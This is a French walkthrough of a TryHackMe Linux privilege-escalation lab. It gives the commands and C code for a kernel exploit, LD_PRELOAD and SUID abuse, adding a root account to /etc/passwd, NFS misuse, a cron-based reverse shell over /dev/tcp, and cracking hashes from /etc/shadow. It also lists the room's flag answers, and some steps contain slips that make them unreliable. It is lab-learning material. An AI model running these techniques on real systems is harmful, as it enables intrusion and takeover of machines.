# TryHackMe: Linux Privilege Escalation

> **Ce writeup a été réalisé à la suite de la room **[**Linux Privilege Escalation**](https://tryhackme.com/room/linprivesc)** sur TryHackMe.**
>
> Apprends les bases et les techniques avancées de l'escalade de privilèges sous Linux. Ce guide couvre la phase d'énumération, les exploits kernel, SUID, sudo, cron, capabilities, et bien plus.

## 🧭 Introduction

Au travers de cette room, j'ai pu découvrir et pratiquer plus de huit techniques différentes d'escalade de privilèges. Chaque étape m'a permis de renforcer ma compréhension des mécanismes internes de Linux : du fonctionnement d'OverlayFS aux subtilités des options NFS, en passant par les capacités POSIX et les setuid. Voici mon retour détaillé, structuré étape par étape.

## 🧭 Phase 1 : Enumeration

**Objectif :** Collecter un maximum d'informations sur la cible afin d'orienter les attaques.

**Sur la machine cible :**

```bash
$ hostname         # Nom de l'hôte pour contextualiser
$ uname -a         # Version du kernel et architecture
$ cat /etc/issue   # Distribution et version Linux
$ python --version # Vérifier la présence de Python
$ id               # UID/GID de l'utilisateur actuel
$ whoami           # Nom d'utilisateur
$ ps aux           # Processus en cours
$ sudo -l          # Listing des commandes sudo autorisées
```

**Sur ma machine locale :**

```bash
$ searchsploit linux 3.13.0 Ubuntu 14.04  # Rechercher des exploits connus
```

Cette recherche m’a conduit vers la vulnérabilité \`\`, liée à OverlayFS.

## 🛠️ Phase 2 : Kernel Exploit (OverlayFS: CVE-2015-1328)

**Objectif :** Exploiter une faille kernel pour obtenir un shell root.

### Sur ma machine locale :

1. Récupérer l’exploit :
   ```bash
   $ searchsploit -m 37292.c -o overlayfs_exploit.c
   ```
2. Démarrer un serveur HTTP :
   ```bash
   $ cd ~/exploit
   $ python3 -m http.server 8000
   ```

### Sur la machine cible :

```bash
$ cd /tmp                               # Dossier exécutable
$ wget http://<TARGET-IP>:8000/overlayfs_exploit.c
$ gcc overlayfs_exploit.c -o rootme     # Compiler l'exploit
$ chmod +x rootme                       # Rendre exécutable
$ ./rootme                              # Lancer l'exploit
$ id                                    # Vérifier l'UID
```

| Flag   | flag1.txt          |
| ------ | ------------------ |
| Answer | THM-28392872729920 |

## 🧪 Phase 3 : Escalade via sudo + LD\_PRELOAD

**Objectif :** Abuser de sudo et de LD\_PRELOAD pour injecter du code root.

### Sur ma machine locale :

Créer `inject_root.c` :

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");  // Nettoyer l'environnement
    setuid(0);
    setgid(0);
    system("/bin/bash");      // Shell root
}
```

Compiler :

```bash
$ gcc -fPIC -shared -o inject_root.so inject_root.c -nostartfiles
```

### Sur la machine cible :

```bash
$ sudo -l                                                # Vérifier les droits sudo
$ sudo LD_PRELOAD=/home/user/inject_root.so find         # Lancer un binaire exploitable
```

| Flag   | flag2.txt     |
| ------ | ------------- |
| Answer | THM-402028394 |

## 📡 Phase 4 : Sudo Nmap Interactive

**Objectif :** Obtenir un shell via nmap interactif.

### Sur la machine cible :

```bash
$ sudo nmap --interactive  # Mode interactif de nmap
nmap> !sh                  # Échapper vers un shell
# whoami                   # Vérifier l'UID
```

## 🔐 Phase 5 : SUID Binaries

**Objectif :** Identifier et abuser des binaires avec setuid root.

### Sur la machine cible :

```bash
$ find / -type f -perm -04000 -ls 2>/dev/null  # Lister les SUID
```

Si `nano`, `vim` ou un autre éditeur possède le bit SUID :

```bash
$ /usr/bin/nano /etc/shadow                    # Lire /etc/shadow
```

## 🧬 Phase 6 : Création d’un utilisateur root

**Objectif :** Ajouter un compte root via modification de /etc/passwd.

### Sur ma machine locale :

```bash
$ openssl passwd -1 "MySecurePass"                  # Générer un hash MD5
```

Résultat : `$1$example$HASH...`

### Sur la machine cible :

Ajouter dans `/etc/passwd` :

```text
admin:$1$example$HASH...:0:0:root:/root:/bin/bash
```

Puis :

```bash
$ su admin
# whoami                                          # Doit renvoyer root
```

## 📁 Phase 7 : NFS (no\_root\_squash)

**Objectif :** Exploiter un partage NFS mal configuré pour déposer un binaire SUID.

### Sur ma machine attaquante :

```bash
$ mkdir /mnt/share
$ sudo mount -o rw <TARGET-IP>:/mnt/nfs_share /mnt/share  # Monter le partage
$ cd /mnt/share                                         # Se placer dans le dossier
```

Créer `escalate.c` :

```c
#include <stdlib.h>
#include <unistd.h>

int main() {
   setuid(0);
   setgid(0);
   system("/bin/bash");
   return 0;
}
```

Compiler et setuid :

```bash
$ gcc escalate.c -o r00t_bin
$ chmod +s r00t_bin
```

### Sur la machine cible :

```bash
$ /mnt/nfs_share/r00t_bin   # Exécuter le binaire dans le partage
# whoami                    # Devient root
```

| Flag   | flag7.txt    |
| ------ | ------------ |
| Answer | THM-89384012 |

## ⚙️ Phase 8 : Capabilities

**Objectif :** Utiliser les POSIX capabilities pour escalader.

### Sur la machine cible :

```bash
$ getcap -r / 2>/dev/null      # Lister les capabilities
```

Si `python3 = cap_setuid+ep` :

```bash
$ ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'  # Shell root
```

| Flag   | flag4.txt   |
| ------ | ----------- |
| Answer | THM-9349843 |

## ⏱️ Phase 9 : Cron Jobs

**Objectif :** Modifier un script cron pour lancer une reverse shell.

### Sur la machine cible :

```bash
$ cat /etc/crontab                # Identifier les jobs
```

Script vulnérable : `/usr/local/bin/backup.sh`

### Sur ma machine locale :

```bash
$ echo 'bash -i >& /dev/tcp/<TARGET-IP>/4444 0>&1' > backup.sh
$ chmod +x backup.sh              # Préparer le payload
```

### Sur la machine attaquante :

```bash
$ nc -lvnp 4444                   # Lancer un listener
```

Attendre l'exécution cron pour obtenir le shell.

| Flag   | flag5.txt     |
| ------ | ------------- |
| Answer | THM-383000283 |

## 📌 Phase 10 : Hijacking de PATH

**Objectif :** Tromper un script qui appelle un binaire sans chemin absolu.

### Sur la machine cible :

```bash
$ find / -writable 2>/dev/null | grep home  # Dossiers éditables
```

Créer le faux binaire `checkupdate` :

```bash
$ echo "cat /root/flag6.txt" > /home/user/hijack/checkupdate
$ chmod +x /home/user/hijack/checkupdate
$ export PATH=/home/user/hijack:$PATH     # Redéfinir le PATH
$ ./run_update                           # Script vulnérable
```

| Flag   | flag6.txt     |
| ------ | ------------- |
| Answer | THM-736628929 |

## 🔐 Phase 11 : Cracking de hash (base64 + John)

**Objectif :** Extraire puis cracker les mots de passe Linux.

### Sur la machine cible :

```bash
$ base64 /etc/passwd > passwd64.txt
$ base64 /etc/shadow > shadow64.txt
$ base64 -d passwd64.txt > passwd.txt
$ base64 -d shadow64.txt > shadow.txt
$ unshadow passwd.txt shadow.txt > merged.txt
$ john --wordlist=/usr/share/wordlists/rockyou.txt merged.txt
$ john --show merged.txt
```

Mot de passe root trouvé : `Password1`

```bash
$ su missy
```

| Flag   | flag1.txt          |
| ------ | ------------------ |
| Answer | THM-42828719920544 |

## 🎯 Phase finale : exécution root via sudo

**Objectif :** Exploiter un dernier privilège sudo pour lancer un shell.

### Sur la machine cible :

```bash
$ sudo -l
$ sudo find / -name "*flag*.txt"      # Localiser les flags
$ sudo find . -exec /bin/sh \; -quit # Obtenir un shell root
```

| Flag   | flag2.txt           |
| ------ | ------------------- |
| Answer | THM-168824782390238 |

---

## 📝 Conclusion

Cette room "Linux Privilege Escalation" m'a permis de consolider mes connaissances sur :

- Les failles kernel et l'importance des mises à jour.
- Les différentes méthodes d'escalade : exploits, sudo, SUID, capabilities, cron, NFS.
- L'art de l'énumération et la recherche d'indices via `ps`, `sudo -l`, `getcap`, etc.

Ce guide structuré reste un support idéal pour mes futurs pentests ou CTF, tout en soulignant l'importance des contrôles de sécurité (AppArmor, SELinux, configurations NFS, permissions).

---

**Auteur :** Saad Idrissi
